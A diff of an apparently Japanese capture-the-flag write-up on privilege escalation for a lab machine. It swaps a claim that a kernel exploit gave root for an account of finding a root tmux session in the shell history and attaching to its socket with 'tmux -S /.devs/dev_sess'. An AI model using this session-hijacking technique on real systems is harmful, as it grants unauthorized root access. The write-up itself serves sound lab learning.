@@ -108,20 +108,7 @@ $ ./linpeas.sh tee linpeas.txt
 
 結果を見ていきます。
 
-`127.0.0.1:631`が気になります。
-
-``` bash
-╔══════════╣ Active Ports
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                             
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                     
-tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
-tcp6       0      0 :::80                   :::*                    LISTEN      -               
-tcp6       0      0 :::22                   :::*                    LISTEN      -               
-tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
-tcp6       0      0 :::443                  :::*                    LISTEN      -
-```
-
-また、いくつか刺さりそうな脆弱性もあるようです。
+カーネルバージョンが古いので、いくつか刺さりそうな脆弱性もあるようです。
 
 ``` bash
 ╔══════════╣ Executing Linux Exploit Suggester 2
@@ -154,8 +141,35 @@ sudoのバージョンもかなり古そうです。
 Sudo version 1.8.3p1 
 ```
 
-とりあえずいくつかサジェストされたエクスプロイトを試してみたところ、[Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalation (2) - Linux_x86-64 local Exploit](https://www.exploit-db.com/exploits/26131)のエクスプロイトでrootを取得できました。
+とりあえずいくつかサジェストされたエクスプロイトを試してみたものの、rootは取得できませんでした。
+
+続いて、端末内のhistoryを見てみると、何やらルート権限のtmuxで作業をしていたことがわかります。
+
+``` bash
+hype@Valentine:~$ history
+    5  cd /
+    6  ls -la
+    7  cd .devs
+    8  ls -la
+    9  tmux -L dev_sess
+   10  tmux a -t dev_sess
+   11  tmux --help
+   12  tmux -S /.devs/dev_sess
+   13  exit
+```
+
+tmuxとはターミナルの多重化ソフトウェアで、一つのSSHセッションで複数のターミナルを持つことができます。
+
+そのためシェルが切断された後も別の端末から作業が継続できるようです。
+
+ここで、historyの情報から、端末内の`/.devs/dev_sess`に`-L`オプションでソケットを作成していたことがわかります。
+
+そのため、以下のコマンドでroot権限のシェルに接続することでrootを取得できました。
+
+``` bash
+$ tmux -S /.devs/dev_sess 
+```
 
 ## まとめ
 
-ローカルエクスプロイトが何してるかわからなかったのでいつかちゃんと読みたい。
+DirtyCowのエクスプロイトがうまく刺さらなかったのでいつかちゃんと読みたい。
